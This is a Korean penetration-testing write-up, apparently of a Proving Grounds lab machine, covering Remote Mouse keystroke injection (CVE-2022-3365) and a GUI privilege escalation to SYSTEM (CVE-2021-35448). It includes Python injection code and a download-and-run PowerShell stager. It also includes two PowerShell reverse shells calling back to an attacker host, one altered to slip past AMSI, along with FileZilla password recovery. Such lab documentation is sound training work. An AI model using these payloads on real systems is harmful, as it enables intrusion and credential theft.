---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/payload/revshell
  - tech/cred/config-file
  - tech/exec/rdp
  - tech/win/gui-lpe
type: machine
platform: pg
os: windows
ip: 192.168.248.199
ports: [1978, 1979, 1980, 3389]
services: [ms-wbt-server, pearldoc-xact, remotemouse, unisql-java]
cves: [CVE-2022-3365, CVE-2021-35448]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.248.199` · Windows 10 Pro 20H2(빌드 10.0.19042.1348) · Fundamental · 플래그 2개
> 진입점: TCP/UDP 1978 Remote Mouse 3.008 — 연결 암호 미설정 상태에서 키입력 주입(CVE-2022-3365 / EDB 46697) → 시작 메뉴에 PowerShell 스테이저 타이핑 → `divine` 대화형 셸
> 권한상승: FileZilla `recentservers.xml` 에서 `divine:ControlFreak11` 회수 → RDP 로 GUI 진입 → Remote Mouse GUI 의 Image Transfer Folder 대화상자로 SYSTEM cmd 실행(CVE-2021-35448 / EDB 50047)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.199

### Initial Access – 연결 암호가 비어 있는 Remote Mouse 서버에 키입력을 주입해 시작 메뉴로 PowerShell 스테이저를 타이핑

**Vulnerability Explanation:** Remote Mouse Server(Emote Interactive)의 커스텀 제어 프로토콜에 대한 무인증 OS 명령 주입 — CVE-2022-3365.
- NVD 원문 요지 — *"reliance on a trivial substitution cipher, sent in cleartext, and the reliance on a default password when the user does not set a password"*. 즉 「인증이 없다」가 아니라 **「암호를 안 걸면 기본 암호로 동작한다」**임. 이 박스는 설정의 `Password for Connection` 이 비어 있었음
- 프로토콜은 마우스·키 이벤트만 전달함. `run` 류 명령은 없음. 그럼에도 **주입된 키가 콘솔 세션의 현재 사용자 컨텍스트로 들어가므로**, 시작 메뉴 검색창에 명령을 타이핑하는 것이 곧 OS 명령 실행이 됨
- 이 박스는 `AutoAdminLogon=1` / `DefaultUserName=divine` 으로 `divine` 이 콘솔에 자동 로그인돼 있어 주입 결과가 `divine` 권한으로 실행됨. 콘솔에 로그인된 사용자가 없었다면 타이핑할 대상 자체가 없음

**Vulnerability Fix:**
- 설정의 `Password for Connection` 지정. 다만 프로토콜이 자명한 치환 암호를 평문 전송하므로 근본 대책은 제거·네트워크 격리
- 버전 갱신 — Metasploit `exploit/windows/misc/remote_mouse_rce` 가 대상을 `< 4.200` 으로 명시함
- 자동 로그인(`AutoAdminLogon`) 해제 — 주입의 실행 컨텍스트가 사라짐

**Severity:** Critical — 무인증 원격 명령 실행

**Steps to reproduce the attack:**
1. `-p-` 전체 포트 스캔으로 1978~1980 발견, 1978 배너로 Remote Mouse 확정
2. Kali 에 리버스셸 스테이저(`/a`)를 HTTP 로 올리고 nc 리스너를 443 에 준비
3. `mice_type.py` 로 마우스를 화면 좌하단(시작 버튼)까지 몰아 클릭
4. 시작 메뉴 검색창에 `powershell -nop -w hidden iex(irm http://192.168.45.207/a)` 를 타이핑하고 Enter
5. 443 콜백 수신 → `remote-pc\divine` 대화형 PowerShell
6. `C:\Users\divine\Desktop\local.txt` 를 원위치 `type`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.199 | TCP: 1978, 1979, 1980, 3389, 7680 |

```text
# Nmap 7.98 scan initiated Thu Aug 20 22:20:38 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.199
Nmap scan report for 192.168.248.199
Host is up (0.085s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
|_ssl-date: 2026-08-20T13:24:14+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-08-20T13:23:51+00:00
| ssl-cert: Subject: commonName=Remote-PC
| Not valid before: 2026-07-15T23:24:15
|_Not valid after:  2027-01-14T23:24:15
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%), Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
— 출처: `~/PG/Mice/nmap.log`

핵심 줄은 `1978/tcp open remotemouse Emote Remote Mouse` — nmap 이 서비스 이름까지 찍어줌. 3389 는 뒤에 GUI 진입에 쓰고, 7680 은 Windows Delivery Optimization(업데이트 P2P 배포)이라 공격면 아님.

**top-1000 만 돌리면 이 박스는 「RDP 만 열린 상자」로 보인다.** 1978~1980 이 기본 1000 포트 밖임:

```text
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
— 출처: `~/PG/Mice/nmap_quick.log`

UDP 로도 안 잡힘 — 상위 100 UDP 는 전부 무응답이었고 1978 은 애초에 상위 100 에 없음.

```text
All 100 scanned ports on 192.168.248.199 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)
```
— 출처: `~/PG/Mice/nmap_udp.log`

**그런데 키입력 주입 자체는 UDP 1978 로 나간다.** TCP 1978 은 배너·핸드셰이크용임. 열거는 TCP 로 하고 공격은 UDP 로 하는 서비스가 있다는 것.

배너를 직접 받아보면 1978 만 응답함:

```text
1978 banner: b'SIN 15win nop nop 300'
```
— 출처: `~/PG/Mice/banner_1978.txt`

```text
--- 1979 ---
ERR timed out
--- 1980 ---
ERR timed out
--- 7680 ---
ERR timed out
```
— 출처: `~/PG/Mice/banner_others.txt`

**1979·1980 의 `unisql-java?`·`pearldoc-xact?` 는 식별 결과가 아니다.** 물음표는 nmap 이 배너를 못 받았다는 뜻이고, 이름은 `nmap-services` 의 포트번호 사전 항목을 그대로 출력한 것임.

정체는 셸을 잡은 뒤 온-박스 `netstat` 이 확정해 줌 — **1978·1979·1980 이 전부 PID 2640 = `RemoteMouse.exe` 소유**:

```text
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1978           0.0.0.0:0              LISTENING       2640
  TCP    0.0.0.0:1979           0.0.0.0:0              LISTENING       2640
  TCP    0.0.0.0:1980           0.0.0.0:0              LISTENING       2640
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       8
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1264
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       3896
  TCP    192.168.248.199:139    0.0.0.0:0              LISTENING       4
```
— 출처: `~/PG/Mice/harvest_divine.txt` `NETSTAT -ANO (listening)` 절(동적 RPC 49664–49669 과 IPv6 중복 행은 생략)

CVE-2021-35448 설명문의 *"It binds to local ports to listen for incoming connections"* 가 이 세 포트임. 반대로 135·139·445 는 내부에서 LISTEN 인데 외부 `-p-` 스캔에는 안 잡힘 — 호스트 방화벽이 SMB/RPC 를 막고 있어 그쪽으로 팔 것이 없음.

**버전 판정 — Remote Mouse 3.008.** 근거 두 개.
- nmap 배너 `Emote Remote Mouse` — 제품 확정(버전은 안 나옴)
- 셸 획득 후 설치 프로그램 목록:

```text
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Remote Mouse version 3.008
VMware Tools
```
— 출처: `~/PG/Mice/shell443.log:867-869` (`--INSTALLED-SW` 절에서 해당 3행만 발췌)

3.008 은 키입력 주입(EDB 46697 / CVE-2022-3365)과 GUI 권한상승(CVE-2021-35448, NVD 가 3.008 을 명시)이 둘 다 성립하는 버전임. 뒤에 LPE 가 실제로 통한 것이 세 번째 근거가 됨.

**OS 빌드 판정 — 10.0.19042.**

```text
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
```
— 출처: `~/PG/Mice/harvest_divine.txt` `SYSTEMINFO` 절

두 번째 근거는 SYSTEM cmd 배너의 `Microsoft Windows [Version 10.0.19042.1348]`(`Post-Exploitation` 절 스크린샷). nmap 의 `Product_Version: 10.0.19041` 만 다른데 모순이 아님 — RDP NTLM 이 광고하는 것은 **커널 버전**이고, 19041/19042 는 같은 코드베이스(20H1/20H2)라 RDP 쪽이 19041 로 표시됨.

### Initial Access – Remote Mouse 키입력 주입 RCE

Kali 리스너는 tmux 안에 띄움. 비대화형 SSH 는 호출이 끝나면 자식을 죽이므로 필수임.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s mice_shell 'sudo rlwrap nc -lvnp 443; exec bash'"
```
— 이 세션 전문이 `~/PG/Mice/shell443.log`(7,868행). 아래 인용은 전부 이 파일에서 나옴

**어느 포트가 나가는지 한 번에 쟀다.** 먼저 한 것은 포트를 바꿔 리스너를 띄우는 쪽이었고 — `shell53.log` 22:28:34 · `shell4444.log` 22:28:39 · `shell8080.log` 22:28:46, 세 파일 다 `listening on [any] <포트> ...` 한 줄뿐 — **어느 계층에서 실패하는지는 그것으로 못 갈랐음.** 그래서 타겟에서 직접 아웃바운드를 프로브해 결과를 Kali HTTP 서버의 URL 경로로 보고하게 함. 결과는 웹 로그에 그대로 남음:

```text
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /a HTTP/1.1" 200 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /who_divine_REMOTE-PC HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /OPEN_443 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /ERR_443 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /BLOCK_53 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /ERR_53 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /OPEN_80 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /ERR_80 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /BLOCK_4444 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /ERR_4444 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:37] "GET /BLOCK_8080 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:37] "GET /ERR_8080 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:38] "GET /RTP_True HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:38] "GET /RTP_unknown HTTP/1.1" 404 -
```
— 출처: `~/PG/Mice/http.log` 22:29:35~38 구간의 `GET` 행(사이사이 `code 404, message File not found` 행은 뺌)

**443·80 은 나가고 53·4444·8080 은 막혀 있다.** 404 여도 상관없음 — 요청이 도착했다는 사실만 필요함. `RTP_True` 는 Defender 실시간 보호가 켜져 있다는 보고이고, 이것이 다음 단계의 복선이 됨.
`[가정]` 각 포트 뒤에 따라오는 `ERR_<포트>` 계열과 `RTP_unknown` 의 의미는 **관측 없음** — 프로브 스크립트가 `/a` 로 올라갔다가 이후 리버스셸로 덮어써져 원본이 남지 않음. 판정에 쓴 것은 `OPEN_`/`BLOCK_` 계열임.

**주입 스크립트.** EDB 46697 을 py3 로 포팅함. 배너·핸드셰이크는 TCP 1978, 실제 이벤트는 **UDP 1978** 로 던짐:

```python
def udp(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(cmd.encode(), (IP, PORT))
    s.close()

def ping():
    s = socket.socket(); s.settimeout(5); s.connect((IP, PORT))
    r = s.recv(1048); s.close(); return r
```
— 출처: `~/PG/Mice/mice_type.py`

키코드는 자체 인코딩임 — `key  7[ras]84` 가 소문자 `a`, `key  3RTN` 이 Enter. 마우스는 `mos  5m 1 0`(1픽셀 이동)·`mos  5R l d`/`l u`(좌클릭 다운/업). PoC 가 문자→키코드 표를 통째로 담고 있어 임의 문자열을 타이핑할 수 있음.

절대 좌표를 모르므로 화면 밖으로 충분히 밀어 모서리에 붙인 뒤 클릭함:

```python
    payload = sys.argv[1]
    print('banner:', ping())
    move(-5000, 3000)
    click()
    time.sleep(2)
    sendstr(payload)
    time.sleep(1.5)
    sendstr('\n')
    print('typed:', payload)
```
— 출처: `~/PG/Mice/mice_type.py`

문자당 지연이 기본 0.4초임(`sendstr(s, delay=0.4)`). **명령이 길수록 그대로 손해**라 스테이저를 짧게 유지할 이유가 여기 있음.

```bash
python3 mice_type.py "powershell -nop -w hidden iex(irm http://192.168.45.207/a)"
```
— 실제 타이핑된 문자열: `~/PG/Mice/attempt3_obf.log`(3회차 주입, 22:31:11). 1·2회차는 `-nop -w hidden` 없이 던졌음(`attempt1_type.log` 22:28:01 · `attempt2_diag.log` 22:29:34)

`-nop` 은 프로필 로딩을 건너뛰어 시작을 빠르게 하고, `-w hidden` 은 창을 숨겨 화면에 PowerShell 창이 뜨는 것을 막음. 화면이 그대로 노출되는 GUI 주입에서는 실용적인 차이임.

**⚠️ 스테이저 페이로드는 난독화해야 붙었다.** 처음 올린 `/a` 는 평문 원라이너였고 443 리스너가 조용했음:

```powershell
$c=New-Object System.Net.Sockets.TCPClient('192.168.45.207',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
```
— 출처: `~/PG/Mice/www/a.revshell443` (붙지 않은 판, mtime 22:28)

**3회차 주입(22:31:11)까지도 `/a` 는 아직 평문판이었다** — `http.log` 의 `/a` 요청은 22:28:02·22:29:35·22:31:11 이고 `www/a` 교체가 22:32:24 임. 문자열을 쪼개고 `iex` 를 없앤 판으로 갈아끼운 뒤 22:33:06·22:34:14 의 `/a` 요청이 그 판을 받았고, 22:34:58(`proof_user.txt` 기록 시각)에는 셸이 살아 있었음:

```powershell
$TC='System.Net.Sockets.TCP'+'Client'
$c=New-Object $TC('192.168.45.207',443)
$s=$c.GetStream()
$hi=([text.encoding]::ASCII).GetBytes('HELLO-SHELL-ALIVE'+[char]10)
$s.Write($hi,0,$hi.Length);$s.Flush()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
 $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
 $sb=(& ([scriptblock]::Create($d)) 2>&1 | Out-String )
 $sb2=$sb+'PS '+(pwd).Path+'> '
 $sby=([text.encoding]::ASCII).GetBytes($sb2)
 $s.Write($sby,0,$sby.Length);$s.Flush()
}
$c.Close()
```
— 출처: `~/PG/Mice/www/a` (붙은 판)

`iex` 대신 `& ([scriptblock]::Create($d))` 를 쓴 것은 의도적임 — `iex` 는 AMSI 가 가장 먼저 보는 이름이라 그 자체로 시그니처가 됨. `HELLO-SHELL-ALIVE` 는 「붙었는지」를 즉시 알기 위해 넣은 마커임.

콜백:

```powershell
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.199] 50672
HELLO-SHELL-ALIVE
remote-pc\divine
Remote-PC
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
PS C:\WINDOWS\system32> 
```
— 출처: `~/PG/Mice/shell443.log:1-7`

Medium 무결성의 `remote-pc\divine` 대화형 PowerShell.

**셸 직후 반사 열거.** Windows 에서는 `find -perm`·`getcap` 자리에 `whoami /all`(그룹·특권) → `net user`·`net localgroup administrators`(누가 관리자인가) → 서비스 목록과 바이너리 `icacls`(쓰기 가능한 것) → `schtasks`(비-MS 예약작업) → `reg query`(AutoAdminLogon·AlwaysInstallElevated·Run 키) → `cmdkey /list`(저장된 자격증명)가 들어감. 이걸 한 스크립트로 묶은 것이 `www/harvest.ps1` 이고 산출물은 `harvest_divine.txt`(6,692행 · 16개 섹션 + `DONE`).

**Local.txt value:**
`e5fe064cc8ccf3adb8c974baf67f12c5`

nc 리버스셸(대화형 PowerShell) 안에서 원위치 `type` 으로 읽음:

```powershell
whoami; hostname; (ipconfig | Select-String IPv4); Get-Date; type C:\Users\divin
e\Desktop\local.txt
remote-pc\divine
Remote-PC

   IPv4 Address. . . . . . . . . . . : 192.168.248.199

DisplayHint : DateTime
Date        : 8/20/2026 12:00:00 AM
Day         : 20
DayOfWeek   : Thursday
DayOfYear   : 232
Hour        : 6
Kind        : Local
Millisecond : 541
Minute      : 34
Month       : 8
Second      : 45
Ticks       : 639228044855414238
TimeOfDay   : 06:34:45.5414238
Year        : 2026
DateTime    : Thursday, August 20, 2026 6:34:45 AM

e5fe064cc8ccf3adb8c974baf67f12c5


PS C:\WINDOWS\system32>
```
— 출처: `~/PG/Mice/proof_user.txt` 전문(600B). 첫 줄이 `divin` / `e\Desktop` 로 갈린 것은 셸의 줄바꿈 그대로임

### Privilege Escalation – Remote Mouse GUI 파일 대화상자 (CVE-2021-35448)

**Vulnerability Explanation:** `RemoteMouseService.exe`(LocalSystem)가 GUI 프로세스를 사용자 세션에 **자식으로** 띄움 — Session 0 격리 우회.
- 그 GUI 설정의 `Image Transfer Folder` → `Change...` 가 **SYSTEM 소유의 「다른 이름으로 저장」 대화상자**를 띄움
- 대화상자 **주소창**에 실행 파일 경로를 넣고 Enter 하면 탐색기가 그것을 「이동할 위치」로 해석하고, 대상이 실행 파일이면 **실행**함 → SYSTEM cmd
- NVD 원문이 그대로 절차임 — *"Emote Interactive Remote Mouse 3.008 on Windows allows attackers to execute arbitrary programs as Administrator by using the Image Transfer Folder feature to navigate to cmd.exe."*
- 여기 도달하는 데 쓴 것은 FileZilla `recentservers.xml` 의 base64 자격증명(설정 파일 평문 저장). GUI 조작이 필요해 RDP 진입이 전제이고, 그 로그인에 이 자격증명을 씀

**Vulnerability Fix:**
- Remote Mouse 제거, 또는 3.008 상위 버전으로 갱신(CVE-2021-35448). 서비스가 GUI 를 사용자 세션에 SYSTEM 권한으로 띄우지 않게 할 것
- FileZilla 설정 파일에 자격증명을 평문/base64 로 저장하지 말 것 — 마스터 암호를 걸거나 자격증명 관리자로 대체
- OS 계정 암호를 애플리케이션 저장소와 공유하지 말 것. 이 박스는 FTP 암호와 Windows 로그인 암호가 같아 RDP 진입이 그대로 열림

**Severity:** Critical — 로컬 사용자에서 즉시 SYSTEM

**Steps to reproduce the attack:**
1. `harvest.ps1` 로 표준 Windows 권한상승 벡터 소거 — 전부 불가
2. `C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml` 에서 base64 암호 회수 → `ControlFreak11`
3. `ValidateCredentials` 로 소유자 확정 — Administrator 아님, `divine` 자신의 Windows 암호
4. `divine` 이 `Remote Desktop Users` 이므로 그 자격증명으로 RDP 진입
5. 트레이 Remote Mouse → Preferences → Settings → `Image Transfer Folder` → `Change...`
6. Save As 대화상자 **주소창**에 `C:\Windows\System32\cmd.exe` 입력 후 Enter → SYSTEM cmd

**표준 벡터가 전부 막혀 있었다.** `harvest_divine.txt` 각 절에서:

- `whoami /all` — 그룹은 `BUILTIN\Users` · `BUILTIN\Remote Desktop Users` 뿐. 특권은 `SeShutdown`·`SeChangeNotify`·`SeUndock`·`SeIncreaseWorkingSet`·`SeTimeZone` 5개. **`SeImpersonatePrivilege` 없음 → Potato 계열 불가.** Medium IL
- `net localgroup administrators` — 멤버는 `Administrator` 단독. 계정은 `Administrator`·`DefaultAccount`·`divine`·`Guest`·`WDAGUtilityAccount`
- 비-MS 예약작업 — `\OneDrive Standalone Update Task`(RunAs divine / Limited) 하나뿐
- `AlwaysInstallElevated` — 양쪽 하이브 다 키 없음(`ERROR: The system was unable to find the specified registry key or value.`)
- 저장된 자격증명 — `LegacyGeneric:target=XboxLive` 하나. PowerShell 히스토리 없음
- SeriousSAM(CVE-2021-36934) — `C:\Windows\System32\config\SAM: Access is denied.`
- 서비스 바이너리 — divine 이 쓸 수 있는 것 없음. `RemoteMouseService.exe` 의 ACL 도 `BUILTIN\Users:(I)(RX)` 로 읽기·실행뿐임:

```text
-- RemoteMouseService: C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe
C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                           BUILTIN\Administrators:(I)(F)
                                                           BUILTIN\Users:(I)(RX)
                                                           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```
— 출처: `~/PG/Mice/harvest_divine.txt:429-434`

배제한 두 후보도 여기서 닫힘. **EDB 50258(Remote Mouse 4.002 Unquoted Service Path)** — 이 박스는 3.008 이고, 무엇보다 `icacls C:\` 가 `Authenticated Users` 에 `(AD)`(디렉터리 생성만)와 `(IO)`(상속 전용) 만 주고 있어 첫 후보 `C:\Program.exe` 라는 **파일**을 만들 수 없음. **`C:\freezeScript\win10.ps1`** — Administrator 가 `-ExecutionPolicy bypass` 로 이 인스턴스가 켜진 날 06:10:10 에 돌린 transcript 가 디스크에 남아 있으나, 디렉터리가 자기삭제됐고(`dir C:\freezeScript` → `File Not Found`) 사용자 접근 가능한 재실행 트리거가 없음. 두 판정의 근거 전량은 [[_PLAYBOOK]].

`AutoAdminLogon` 은 켜져 있으나 `DefaultPassword` 값이 없어 자격증명 회수 경로가 아님:

```text
    AutoLogonSID    REG_SZ    S-1-5-21-2619112490-2635448554-1147358759-1002
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    divine
    DefaultDomainName    REG_SZ    DESKTOP-8OB2COP
```
— 출처: `~/PG/Mice/harvest_divine.txt` `AUTOLOGON (Winlogon)` 절

남는 것은 **파일에 남은 자격증명**임.

**자격증명 회수 — FileZilla 설정.**

```bash
type C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<FileZilla3 version="3.54.1" platform="windows">
	<RecentServers>
		<Server>
			<Host>ftp.pg</Host>
			<Port>21</Port>
			<Protocol>0</Protocol>
			<Type>0</Type>
			<User>divine</User>
			<Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
			<Logontype>1</Logontype>
			<PasvMode>MODE_DEFAULT</PasvMode>
			<EncodingType>Auto</EncodingType>
			<BypassProxy>0</BypassProxy>
		</Server>
	</RecentServers>
</FileZilla3>
```
— 출처: `~/PG/Mice/shell443.log:470-486`

```bash
echo Q29udHJvbEZyZWFrMTE= | base64 -d
```

→ `ControlFreak11`.

**이 암호가 누구 것인지부터 확정한다.** FileZilla 암호가 나오면 반사적으로 Administrator 재사용을 의심하게 됨. 넘겨짚지 말고 온-박스에서 로컬 SAM 에 대고 직접 물어봄 — `www/e6.ps1` 로 올려 셸에서 실행:

```powershell
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Machine")
Write-Output ("--VALID-ADMIN=" + $ctx.ValidateCredentials("Administrator","ControlFreak11"))
Write-Output ("--VALID-DIVINE=" + $ctx.ValidateCredentials("divine","ControlFreak11"))
Write-Output "--E6DONE"
```
— 출처: `~/PG/Mice/www/e6.ps1`

```powershell
PS C:\WINDOWS\system32> --VALID-ADMIN=False
--VALID-DIVINE=True
--E6DONE
```
— 출처: `~/PG/Mice/shell443.log:671-673`

**`ControlFreak11` 은 divine 자신의 Windows 암호다** — Administrator 재사용이 아님. 이후 이 자격증명으로 RDP 가 실제로 붙은 것이 두 번째 확인이 됨.

그럼 쓸모는 무엇인가 — divine 이 `Remote Desktop Users` 이므로 **RDP 로 GUI 세션에 진입**하는 데 씀. Remote Mouse GUI LPE 는 화면 조작이 필요하기 때문임.

**RDP 진입 → Remote Mouse GUI LPE.**

```bash
xfreerdp3 /v:192.168.248.199 /u:divine /p:ControlFreak11 /cert:ignore
```
— 이 세션은 비대화형 SSH 로 돌아 호출 원문이 `~/.zsh_history` 에 남지 않음. 위는 이 볼트가 쓰는 호출 형태를 적은 것이고, RDP 가 붙은 사실 자체는 GUI 스크린샷이 증명함

⚠️ 첫 RDP 접속에서는 **재접속(reconnect)한 세션에 트레이 아이콘이 렌더되지 않아** GUI 에 도달하지 못했음. `shutdown /r` 로 재부팅해 자동 로그인이 세션을 새로 만들게 한 뒤에야 아이콘이 그려짐(divine 은 `SeShutdownPrivilege` 보유). 상세와 진단 순서는 [[_PLAYBOOK]].

GUI 에서:
1. 트레이의 Remote Mouse 아이콘 우클릭 → **Preferences**
2. **Settings** 탭 → 하단 **Image Transfer Folder** → **Change...**
3. 「다른 이름으로 저장」 대화상자가 뜨면서 `C:\WINDOWS\system32\config\systemprofile\Desktop is unavailable` 오류가 함께 뜸 — **이 대화상자가 SYSTEM 프로필에서 도는 증거**. OK 로 닫음
4. 대화상자 **주소창**(파일 이름 칸 아님)을 클릭해 편집 모드로 만들고 `C:\Windows\System32\cmd.exe` 입력 → Enter

![[PG-Mice-remotemouse-settings.png]]

설정 화면 하나가 두 가지를 동시에 보여줌 — 아래쪽 `Image Transfer Folder`(현재 값 `c:`)의 `Change...` 가 LPE 트리거이고, 가운데 `Password for Connection` 이 **비어 있는 것**이 `Initial Access` 가 성립한 이유임.

![[PG-Mice-system-saveas-dialog.png]]

`Save As` 대화상자와 `Location is not available` 오류가 함께 잡힘. 오류 본문이 `C:\WINDOWS\system32\config\systemprofile\Desktop` 을 가리키는 것 — 대화상자의 주인이 SYSTEM 이라는 신호임. 일반 사용자 프로세스라면 그 경로를 홈으로 삼지 않음. 파일 목록은 `C:\Users\divine` 을 보여주고 `File name` 칸에는 `Save Here` 가 들어 있음.

![[PG-Mice-admin-cmd.png]]

`Administrator: C:\Windows\System32\cmd.exe` 창이 뜸. 배너는 `Microsoft Windows [Version 10.0.19042.1348]`. 제목의 `Administrator:` 는 관리자 무결성이라는 뜻이고, 실제 토큰은 `Post-Exploitation` 절에서 `whoami` 로 확인함.

**왜 이게 SYSTEM 이 되는가.** `RemoteMouseService.exe`(LocalSystem)가 부모가 되어 GUI 두 프로세스를 사용자 세션에 띄움:

```powershell
Name            : RemoteMouseService.exe
ProcessId       : 2284
ParentProcessId : 664
SessionId       : 0
CommandLine     : 

Name            : RemoteMouseCore.exe
ProcessId       : 2632
ParentProcessId : 2284
SessionId       : 1
CommandLine     : 

Name            : RemoteMouse.exe
ProcessId       : 2640
ParentProcessId : 2284
SessionId       : 1
CommandLine     : 
```
— 출처: `~/PG/Mice/shell443.log:7832-7848` (`www/e17.ps1` 실행 결과)

Core·GUI 둘 다 `ParentProcessId = 2284` = 서비스 PID 임. 서비스가 세션 0 에 있으면서 자식만 세션 1 로 내보냄 — Session 0 격리를 우회하는 전형임. 그래서 GUI 가 띄우는 파일 대화상자도 SYSTEM 이고, 거기서 실행한 cmd 가 SYSTEM 을 물려받음.

`Get-CimInstance Win32_Process` 의 `GetOwner` 는 이 프로세스들에 대해 Domain/User 를 **빈 문자열**로 돌려줌(`RemoteMouse.exe PID=2640 Owner=\ Session=1`). 소유자가 없어서가 아니라 divine 권한으로는 SYSTEM 프로세스의 소유자를 조회할 수 없어서임 — 그 자체가 「내 권한 밖의 프로세스」라는 신호임.

### Post-Exploitation

**Proof.txt value:**
`31a64d6f198f495e89d3f3e134da9588`

**1차 증거는 스크린샷이다.** SYSTEM cmd 획득 직후 증거 한 화면을 찍었음.

![[PG-Mice-proof-system.png]]

아래 코드블록은 그 화면에서 **손으로 옮겨 적은 전사본**이지 캡처된 스트림이 아님 — 원시 캡처를 회수하지 못한 경위는 이 절 아래에 적음. 값은 스크린샷과 한 글자씩 대조함.

```powershell
C:\>whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
nt authority\system
Remote-PC
   IPv4 Address. . . . . . . . . . . : 192.168.248.199
Thu 08/20/2026
08:05 AM
31a64d6f198f495e89d3f3e134da9588
```
— 출처: `파일보관\PG-Mice-proof-system.png` 전사

`&` 로 이어 붙인 것은 OSCP 증거 관례(`whoami`·`hostname`·IP·플래그를 **한 화면에**)를 cmd 에서 한 줄로 만족시키기 위함임. 리눅스의 `;` 자리에 cmd 는 `&` 를 씀.

**두 플래그 모두 웹셸이 아닌 대화형 셸에서 원위치로 읽었다.**

| 플래그 | 위치 | 어떤 셸에서 읽었나 | 증거 |
|---|---|---|---|
| `local.txt` | `C:\Users\divine\Desktop\` | nc 리버스셸의 대화형 PowerShell (`PS C:\WINDOWS\system32>`) | `~/PG/Mice/proof_user.txt` |
| `proof.txt` | `C:\Users\Administrator\Desktop\` | RDP GUI 안의 대화형 SYSTEM cmd (`C:\>`) | `파일보관\PG-Mice-proof-system.png` |

OSCP 는 웹셸로 얻은 플래그를 0점 처리함.

